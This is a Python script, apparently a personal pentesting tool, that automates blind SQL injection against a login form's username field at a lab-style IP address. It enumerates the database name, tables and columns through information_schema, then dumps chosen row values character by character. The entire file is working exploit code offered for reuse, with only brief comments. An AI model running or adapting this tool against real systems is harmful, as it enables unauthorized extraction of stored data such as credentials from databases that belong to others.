# Just a little script to extract information from a database when I find a blind SQL injection and I don't want to use SQLMap.

import requests,urllib.parse,string


def get_query(query):
	import requests

	# Put here the request from Burp (And inject the query in a vulnerable parameter)
	url = "http://10.10.10.73:80/login.php"
	cookies = {"PHPSESSID": "2kda387k8kthj5mkn8491shcg0"}
	headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.10.10.73", "Connection": "close", "Referer": "http://10.10.10.73/login.php", "Upgrade-Insecure-Requests": "1"}
	form_data = {"username": query, "password": "123"}
	response = requests.post(url, headers=headers, cookies=cookies, data=form_data)

	if(response.ok):
		# You need to extract the true/false value here
		if("Wrong identification" in response.text):
			return True
		else:
			return False

# You will have to play here to guess the database type

# Get current database length
length = 0
for i in range(100):
	query = f"123' or LENGTH(DATABASE())={i}#"
	if get_query(query):
	    print(f"[+] The DB's name length is {i}")
	    length = i
	    break

# Get current database name
dbname = []
for i in range(1, length+1):
	for c in string.printable:
		query = f"123' OR SUBSTRING(DATABASE(), {i}, 1) = '{c}'#"
		if get_query(query):
			dbname.append(c)
			break
dbname = "".join(dbname)
print(f'[+] Found a database with name: {dbname}')

# Get number of tables
n_tables = 0
for i in range(100):
	query = f"123' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_type='base table' AND table_schema='{dbname}')={i}#"
	if get_query(query):
		print(f"[+] It has {i} tables")
		n_tables = i
		break

# Get tables names
found_tables = [[] for _ in range(n_tables)]
end_of_name_count = 0
print("[+] Found tables:")
for table_num in range(n_tables):
	for i in range(1, 100):
		for c in string.printable:
			query = f"123' OR SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='{dbname}' LIMIT {table_num}, 1),{i},1)='{c}'#"
			if get_query(query):
				found_tables[table_num].append(c)
				if(c == ' '):
					end_of_name_count = end_of_name_count + 1
				break
		if(end_of_name_count == 2):
			end_of_name_count = 0
			break
	print(''.join(found_tables[table_num]))

# Get number of columns for a table
selected_table = input("Type the tabname to attack: ")
n_columns = 0
for i in range(1, 100):
	query = f"123' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{selected_table}')='{i}'#"
	if get_query(query):
		print(f"[+] It has {i} columns")
		n_columns = i
		break

# Get columns for a table
found_columns = [[] for _ in range(n_columns)]
end_of_name_count = 0
print("[+] Found columns:")
print("[!] In order to speed up, try to press CTRL+C when you find what you want")
try:
	for column_num in range(n_columns):        
		for i in range(1, 100):
			for c in string.printable:
				query = f"123' OR SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='{selected_table}' LIMIT {column_num}, 1),{i},1)='{c}'#"
				if get_query(query):
					found_columns[column_num].append(c)
					if(c == ' '):
						end_of_name_count = end_of_name_count + 1
					break
			if(end_of_name_count == 2):
				end_of_name_count = 0
				break
		print(''.join(found_columns[column_num]))
except KeyboardInterrupt as e:
	print("\nSkipping this phase!")

# Get numbers of rows for column
selected_column = input("Type the column to attack: ")
n_rows = 0
for i in range(1, 100):
	query = f"123' OR (SELECT COUNT({selected_column}) FROM {selected_table})='{i}'#"
	if get_query(query):
		print(f"[+] It has {i} rows")
		n_rows = i
		break

# Get rows for column
found_rows = [[] for _ in range(n_rows)]
end_of_name_count = 0
print("[+] Found rows:")
print("[!] In order to speed up, try to press CTRL+C when you find what you want")
try:
	for rows_num in range(n_rows):        
		for i in range(1, 100):
			for c in string.printable:
				query = f"123' OR SUBSTR((SELECT {selected_column} FROM {selected_table} LIMIT {rows_num}, 1),{i},1)='{c}'#"
				if get_query(query):
					found_rows[rows_num].append(c)
					if(c == ' '):
						end_of_name_count = end_of_name_count + 1
					break
			if(end_of_name_count == 2):
				end_of_name_count = 0
				break
		print(''.join(found_rows[rows_num]))
except KeyboardInterrupt as e:
	print("\nSkipping this phase!")
